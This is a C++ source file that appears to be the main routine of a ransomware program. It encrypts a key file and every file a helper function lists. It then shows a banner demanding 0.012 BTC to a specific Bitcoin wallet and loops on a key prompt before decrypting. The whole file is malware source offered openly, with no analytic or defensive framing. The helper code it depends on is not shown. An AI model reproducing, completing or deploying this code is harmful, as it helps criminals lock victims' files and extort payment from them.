#include <iostream> 
#include <fstream>
#include <vector>
#include <conio.h>
#include "encryptOPS.h"
#include "key.h"
#include "listfiles.h"
#include "banner.h"

using namespace std;

int main(){
    bool correctKey = false;
    string key = getkey();
	encryptOPS enc = encryptOPS("", key.c_str());

    FileMasterKey();

    enc.setFile("C:\\Users\\Public\\Music\\key.txt");
    enc.encrypt();

    vector<string> files;
    files = getfiles();
    for (int i = 0; i < files.size(); i++){
        enc.setFile(files[i]);
        enc.encrypt();
    }
    
    banner("Your files have been encrypted!");
    while(!correctKey){
        cout << "\nIf you want to decrypt your files, send 0,012 BTC to this wallet: 1LjRaD7U8jJWpFyHwtm7V1gXht8Jj2HmZG\nPut here the key that you will receive: ";
        string masterkey;
        cin >> masterkey;
        //read file C:\Users\Public\Music\key.txt
        ifstream file("C:\\Users\\Public\\Music\\key.txt");
        string line;
        if (file.is_open()){
            enc.setFile("C:\\Users\\Public\\Music\\key.txt");
            enc.decrypt();
            while (getline(file, line)){
                if (line == masterkey){
                    correctKey = true;
                    cout << "Correct key!" << endl;
                }
                else{
                    cout << "Incorrect key!" << endl;
                    enc.encrypt(); 
                }
            }
            file.close();
        }
    }

    cout << "Decrypting files...\nDon't close this window!" << endl;
    files = getfiles();
    for (int i = 0; i < files.size(); i++){
        enc.setFile(files[i]);
        enc.decrypt();
    }

    return 0;
}


